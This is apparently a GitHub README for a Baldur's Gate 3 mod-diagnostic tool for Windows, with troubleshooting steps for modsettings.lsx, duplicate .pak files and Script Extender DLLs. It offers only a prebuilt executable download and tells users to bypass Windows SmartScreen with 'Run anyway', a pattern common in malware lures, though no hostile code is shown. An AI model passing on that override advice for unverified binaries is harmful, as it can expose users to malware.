<p align="center">
  <img src="https://i.postimg.cc/pTNJBQVG/banner.png" alt="BG3 ModSettings Doctor — modsettings.lsx, .pak & Script Extender Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Mod%20%26%20XML%20Diagnostics-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-bg3--mod--doctor--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# BG3 ModSettings Doctor — modsettings.lsx, .pak & Script Extender Checks for Windows

**Baldur's Gate 3 wiping your active mod list back to zero on startup? Multiplayer lobby rejecting friends due to a mod mismatch, or Script Extender mods failing after a hotfix? Inspect your Larian AppData profile before rebuilding your load order.**

BG3 ModSettings Doctor focuses on how Baldur's Gate 3 validates active mods on Windows: **every active `.pak` must be registered cleanly inside `PlayerProfiles\Public\modsettings.lsx`**. A single broken XML tag, duplicate `.pak` version in `%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\Mods`, or outdated `bin\DWrite.dll` causes the game to reset `modsettings.lsx` on launch.

This project is aimed at **Baldur's Gate 3 on Windows (Steam)**. It covers `%LOCALAPPDATA%` `.pak` folders, `modsettings.lsx` integrity, loose `Data` overrides, and Script Extender `DWrite.dll` checks—not redistributing mods or editing saves.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Active mod list resets to empty on startup | Malformed XML or missing `.pak` UUID in `modsettings.lsx` | Back up `PlayerProfiles\Public\modsettings.lsx` and verify `.pak` UUIDs |
| Script Extender mods fail after hotfix | `bin\DWrite.dll` missing or compiled for an older `bg3.exe` build | Check `Baldurs Gate 3\bin\DWrite.dll` and `ScriptExtender` logs |
| Multiplayer rejects join ('Different Mod Settings') | Mismatched `.pak` versions or load order between host and clients | Compare `.pak` filenames and `modsettings.lsx` across all players |
| Broken UI even with all mods disabled | Unpacked loose files left inside `Baldurs Gate 3\Data\Public` or `Generated` | Inspect `Data\` for leftover loose override folders |

## Download for Windows

[**Download BG3ModDoctor.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/BG3ModDoctor.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `BG3ModDoctor.exe`? (Automatic checks in ~2 seconds)

- Scans `%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\Mods` for duplicate `.pak` versions and unextracted archives.
- Validates `PlayerProfiles\Public\modsettings.lsx` XML syntax, size, and last-modified timestamp.
- Checks `Baldurs Gate 3\bin\DWrite.dll` to confirm BG3 Script Extender presence.
- Flags leftover loose override folders in `Baldurs Gate 3\Data` that bypass the Mod Manager.

### Sample Diagnostic Output

```text
[BG3ModDoctor] Inspecting Larian Studios AppData & Steam installation...
[OK]   AppData Mods     : C:\Users\Player\AppData\Local\Larian Studios\Baldur's Gate 3\Mods (24 .pak files)
[WARN] Duplicate check  : Found 2 versions of ImpUI (ImpUI_v1.pak, ImpUI_v2.pak)
[OK]   modsettings.lsx  : Valid XML (14.8 KB, 22 active nodes)
[OK]   Script Extender  : D:\SteamLibrary\steamapps\common\Baldurs Gate 3\bin\DWrite.dll (Detected)
[OK]   Loose Data check : No conflicting unpacked folders in Data\
```

The release ZIP is named `BG3ModDoctor.zip`; the Windows executable inside is named `BG3ModDoctor.exe`.

1. Close Baldur's Gate 3 before moving or checking game files.
2. Click **Download BG3ModDoctor.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `BG3ModDoctor.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Baldur's Gate 3 and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Baldur's Gate 3, and access to `%LOCALAPPDATA%`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `BG3ModDoctor.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Game resets `modsettings.lsx` to empty on launch

When `modsettings.lsx` references a missing `.pak` UUID or contains malformed XML tags, Baldur's Gate 3 overwrites the file with a clean default list during startup.

### Duplicate or conflicting `.pak` archives in `Mods`

Leaving two versions of the same mod `.pak` inside `%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\Mods` causes UUID collisions and silent load failures.

### Script Extender mods stop working after a hotfix

Mods requiring Norbyte's BG3 Script Extender depend on `bin\DWrite.dll` in the Steam installation folder matching the current `bg3.exe` / `bg3_dx11.exe` build.

### Multiplayer co-op rejects connection with 'Different Mod Settings'

Co-op sessions require every player to have identical `.pak` versions and matching load order entries in `modsettings.lsx`.

## Where Baldur's Gate 3 files normally belong

On Windows, user `.pak` archives, load-order XML, and savegames reside in `%LOCALAPPDATA%`:

```text
%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\
├── Mods\
│   └── YourMod.pak
└── PlayerProfiles\
    └── Public\
        ├── modsettings.lsx
        └── Savegames\
            └── Story\
```

If you use BG3 Script Extender, `DWrite.dll` sits separately inside your Steam installation folder at `steamapps\common\Baldurs Gate 3\bin\DWrite.dll`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Baldur's Gate 3 and any external Mod Manager.** Ensure `bg3.exe`, `bg3_dx11.exe`, and Larian Launcher are completely closed.
2. **Back up `PlayerProfiles\Public`.** Copy `modsettings.lsx` and `Savegames` to a dated folder in Documents before exporting a new load order.
3. **Audit `%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\Mods`.** Remove duplicate `.pak` versions and ensure no `.zip` or `.7z` archives remain unextracted inside `Mods`.
4. **Check `modsettings.lsx` file size and XML structure.** Confirm `modsettings.lsx` is non-empty and properly closed before starting the game.
5. **Check `bin\DWrite.dll` if using Script Extender.** Verify `DWrite.dll` is present in `Baldurs Gate 3\bin` and updated for the latest hotfix.
6. **Check `Baldurs Gate 3\Data` for leftover loose overrides.** Unpacked `Public` or `Generated` folders inside `Data` override `.pak` mods even when disabled in the Mod Manager.
7. **Synchronize `modsettings.lsx` for multiplayer.** Share the exact `.pak` list and load order with all co-op partners before hosting.

### Before moving any files

Keep an untouched copy of `PlayerProfiles\Public\modsettings.lsx` and your `Savegames\Story` folder before removing mods mid-campaign.

## What an effective diagnostic report should tell you

A complete profile check inspects **all `.pak` files in `AppData\Local\Larian Studios\Baldur's Gate 3\Mods`**, verifies `modsettings.lsx` size and XML health, detects `bin\DWrite.dll`, and flags loose override folders in `Data`.

## FAQ

**Where is modsettings.lsx located on Windows?**

It is located at `%LOCALAPPDATA%\Larian Studios\Baldur's Gate 3\PlayerProfiles\Public\modsettings.lsx`.

**Why does Baldur's Gate 3 keep disabling all my mods?**

Usually `modsettings.lsx` has a syntax error or points to a `.pak` file that was renamed or deleted, causing the game to regenerate the file.

**Can I mix in-game Mod Manager mods and BG3MM mods?**

Yes, as long as both write valid entries to `modsettings.lsx` and you do not install duplicate copies of the same mod.

**Where is DWrite.dll placed for Script Extender?**

Inside `steamapps\common\Baldurs Gate 3\bin\DWrite.dll`.

**Can this tool edit my character stats or honor mode save?**

No. It focuses strictly on mod-folder and `modsettings.lsx` diagnostics.

**Are third-party mods or Script Extender DLLs included?**

No third-party binaries or mods are bundled with this repository.

## Useful reading

- [Baldur's Gate 3 on Steam](https://store.steampowered.com/app/1086940/Baldurs_Gate_3/)
- [Official Baldur's Gate 3 Website](https://baldursgate3.game/)

## More Windows Game Diagnostic Tools

- [KCD2-ModOrderInspector](../KCD2-ModOrderInspector) — Kingdom Come: Deliverance II `mod.manifest` & `mod_order.txt` audit
- [Starfield-PluginsOrderDoctor](../Starfield-PluginsOrderDoctor) — Starfield `Plugins.txt` & `StarfieldCustom.ini` load order check
- [SkyrimSE-SKSEPluginAudit](../SkyrimSE-SKSEPluginAudit) — Skyrim SE `skse64.log` & DLL plugin compatibility audit
- [CP2077-RedModLogInspector](../CP2077-RedModLogInspector) — Cyberpunk 2077 `RED4ext`, CET & `redscript` log inspector

*Independent community project. Not affiliated with Larian Studios, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
 
